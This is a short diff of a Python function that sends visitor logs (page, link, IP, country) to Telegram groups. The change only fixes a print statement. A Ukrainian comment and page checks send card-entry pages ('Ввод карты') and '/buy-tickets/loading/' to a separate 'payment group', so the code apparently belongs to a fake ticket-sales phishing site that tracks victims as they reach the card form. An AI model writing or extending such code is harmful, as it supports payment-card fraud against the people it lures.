@@ -453,7 +453,7 @@ def send_telegram_log(page, link, ip, country="", extra_user_id=None, important=
             if important:
                 try:
                     requests.post(url, data=data_group, timeout=1)
-                    print(f"/n/n/nn/n/n/n/n/n//n/nn/n/n/n//nn//n/nn/n//n/n/n {page}")
+                    print(f"\n\n\n\n\n\n\n\n\n{page}")
                     # Спеціальне логування в платіжну групу для сторінки введення карти
                     if page == "Ввод карты" or "/buy-tickets/loading/" in link:
                         try:
